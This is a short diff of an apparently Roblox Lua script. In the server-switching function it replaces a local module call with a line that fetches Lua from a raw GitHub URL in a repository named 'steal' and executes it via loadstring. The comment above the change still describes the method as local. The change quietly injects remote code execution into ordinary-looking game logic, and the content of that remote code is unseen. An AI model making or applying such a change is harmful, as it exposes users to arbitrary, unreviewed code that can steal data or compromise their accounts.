@@ -624,7 +624,7 @@ local function switchServer()
     
     -- Método 1: Server Hop local (corrigido)
     local success, errorMsg = pcall(function()
-        local hopModule = createHopModule()
+        local hopModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub07/steal/refs/heads/main/teste1.lua"))()
         hopModule:Teleport(game.PlaceId)
     end)
     
